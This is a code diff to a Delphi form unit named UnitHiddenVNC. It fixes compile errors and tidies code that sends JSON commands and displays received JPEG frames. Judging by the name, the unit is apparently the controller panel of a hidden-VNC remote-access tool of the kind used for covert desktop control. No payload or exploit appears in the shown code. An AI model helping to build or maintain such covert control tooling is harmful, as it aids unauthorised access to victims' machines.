@@ -1,10 +1,11 @@
-﻿unit UnitHiddenVNC;
+unit UnitHiddenVNC;
 
 interface
 
 uses
   Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
-  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls, Vcl.StdCtrls, System.JSON, ncLines;
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls, Vcl.StdCtrls,
+  System.JSON, ncLines, Vcl.Imaging.jpeg;
 
 type
   TJSONSendProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
@@ -52,10 +53,7 @@ var
 
 implementation
 
-{$}R *.dfm}
-
-uses
-  Vcl.Imaging.jpeg;
+{$R *.dfm}
 
 procedure TForm10.FormCreate(Sender: TObject);
 begin
@@ -116,6 +114,7 @@ end;
 procedure TForm10.SendHVNCCommand(const Action: string; Params: TJSONObject);
 var
   JSONObj: TJSONObject;
+  i: Integer;
 begin
   if not Assigned(FSendJSON) then Exit;
 
@@ -124,12 +123,8 @@ begin
     JSONObj.AddPair('action', Action);
     if Assigned(Params) then
     begin
-      while Params.Count > 0 do
-      begin
-        var Pair := Params.Pairs[0];
-        Params.RemovePair(Pair.JsonString.Value);
-        JSONObj.AddPair(Pair);
-      end;
+      for i := 0 to Params.Count - 1 do
+        JSONObj.AddPair(TJSONPair(Params.Pairs[i].Clone));
       Params.Free;
     end;
     FSendJSON(FLine, JSONObj);
@@ -210,10 +205,12 @@ begin
     JPG := TJPEGImage.Create;
     try
       JPG.LoadFromStream(MS);
-      TThread.Synchronize(nil, procedure begin
-        FLastFrame.Assign(JPG);
-        PaintBox1.Invalidate;
-      end);
+      TThread.Synchronize(nil,
+        procedure
+        begin
+          FLastFrame.Assign(JPG);
+          PaintBox1.Invalidate;
+        end);
     finally
       JPG.Free;
     end;
